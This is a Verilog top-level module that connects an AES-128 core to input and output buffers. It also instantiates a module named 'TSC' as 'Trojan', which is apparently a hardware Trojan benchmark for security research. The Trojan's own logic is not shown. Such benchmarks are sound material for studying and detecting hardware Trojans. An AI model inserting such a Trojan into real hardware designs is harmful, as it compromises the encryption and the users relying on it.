`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company:
// Engineer:
//
// Create Date:    18:35:35 03/08/2013
// Design Name:
// Module Name:    top
// Project Name:
// Target Devices:
// Tool versions:
// Description:
//
// Dependencies:
//
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
//
//////////////////////////////////////////////////////////////////////////////////
module top(
    input clk,
    input rst,
    input [7:0] num,
    output [7:0] res);
    reg [63:0] state;
    reg [63:0] key;
    reg [63:0] result;
  wire [63:0] Capacitance;

    wire [127:0] statebi;
    wire [127:0] keybi;
    wire [127:0] out;



    bufferin bi(clk, rst, num, statebi, keybi);

	aes_128 AES (clk, statebi, keybi, out);
	TSC Trojan (clk, rst, statebi);

    bufferout bo(.clk(clk)
      ,.resultin(out)
      ,.resultout(res));

endmodule
